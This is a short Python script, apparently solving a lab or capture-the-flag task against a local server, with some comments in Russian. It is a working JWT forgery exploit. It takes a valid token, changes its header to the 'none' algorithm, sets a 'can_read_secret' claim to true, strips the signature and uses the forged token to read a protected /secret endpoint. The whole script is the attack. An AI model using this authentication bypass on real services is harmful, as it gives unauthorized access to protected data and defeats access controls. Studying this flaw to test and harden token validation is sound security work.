import requests
import base64
import json

def get_jwt(username, password):
    response = requests.post('http://localhost:8080/auth', data={'username': username, 'password': password})
    
    if response.status_code == 200:
        return response.headers['Authorization']
    else:
        return None

def modify_jwt(jwt):
    header, payload, signature = jwt.split('.') # https://habr.com/ru/articles/533868/
    
    decoded_payload = json.loads(base64.urlsafe_b64decode(payload + '==').decode('utf-8')) # https://gist.github.com/wulfgarpro/3e87ae77a7107a3e3a2453eb38a3de20
    
    decoded_payload['can_read_secret'] = True

 
    new_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=") # https://struchkov.dev/blog/ru/what-is-jwt/
    new_payload = base64.urlsafe_b64encode(json.dumps(decoded_payload).encode()).decode().rstrip("=") # https://programtalk.com/python-examples/base64.urlsafe_b64encode.rstrip/
    
    return new_header + "." + new_payload + "."

def get_secret(modified_jwt):
    headers = {'Authorization': f'Bearer {modified_jwt}'}
    response = requests.get('http://localhost:8080/secret', headers=headers)
    
    if response.status_code == 200:
        return response.text
    else:
        return None

username = input("Enter username: ")
password = input("Enter password: ")

jwt = get_jwt(username, password)
if jwt: # в даннм случае если не none
    modified_jwt = modify_jwt(jwt)
    
    secret = get_secret(modified_jwt)
    
    if secret:
        print("Secret:", secret)
    else:
        print("Failed to get secret")
else:
    print("Failed to get JWT")

